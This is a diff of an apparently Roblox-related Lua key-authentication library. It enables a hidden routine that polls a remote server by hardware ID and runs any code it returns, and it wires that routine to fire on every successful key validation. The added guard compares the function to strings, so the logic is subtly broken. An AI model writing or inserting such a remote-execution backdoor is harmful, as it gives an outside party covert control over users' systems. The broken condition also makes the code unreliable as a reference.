@@ -112,32 +112,30 @@ local function GetHardwareID(service)
 end
 
 local function AutomaticHTTPExec(identifier)
-    print("Pelinda HTTP Execution V2")
-    print("************************************************")
-    local No_Execute = "Script_Not_Found"
-    local UUID = GetHardwareID(identifier)
-
-    task.spawn(
-        function()
-            while true do
-                task.wait()
-                local content = game:HttpGet("https://utility.pandadevelopment.net/readcontent?playerid=" .. UUID)
-                if content ~= No_Execute then
-                    local success, result =
-                        pcall(
-                        function()
-                            runcode(content)
+    if AutomaticHTTPExec == "vegax" or AutomaticHTTPExec == "evon" then
+        -- Your code here
+        local No_Execute = "Script_Not_Found"
+        local UUID = GetHardwareID(identifier)
+        task.spawn(
+            function()
+                while true do
+                    task.wait()
+                    local content = game:HttpGet("https://utility.pandadevelopment.net/readcontent?playerid=" .. UUID)
+                    if content ~= No_Execute then
+                        local success, result = pcall(function()
+                                runcode(content)
+                                game:HttpGet("https://utility.pandadevelopment.net/clear?playerid=" .. UUID)
+                            end
+                        )
+                        if not success then
+                            warn("Error executing loaded code:", result)
                             game:HttpGet("https://utility.pandadevelopment.net/clear?playerid=" .. UUID)
                         end
-                    )
-                    if not success then
-                        warn("Error executing loaded code:", result)
-                        game:HttpGet("https://utility.pandadevelopment.net/clear?playerid=" .. UUID)
                     end
                 end
             end
-        end
-    )
+        )
+    end
 end
 
 local function PandaLibNotification(message)
@@ -216,7 +214,7 @@ function PandaAuth:ValidateKey(serviceID, ClientKey)
         end
     )
     if success and data["V2_Authentication"] == "success" then
-		-- AutomaticHTTPExec(serviceID)
+		AutomaticHTTPExec(serviceID)
         return true
     end
     return false
@@ -248,7 +246,7 @@ function PandaAuth:ValidatePremiumKey(serviceID, ClientKey)
         end
     )
     if success and data["V2_Authentication"] == "success" and data["Key_Information"]["Premium_Mode"] == true then
-		-- AutomaticHTTPExec(serviceID)
+	    AutomaticHTTPExec(serviceID)
         return true
     end
     return false
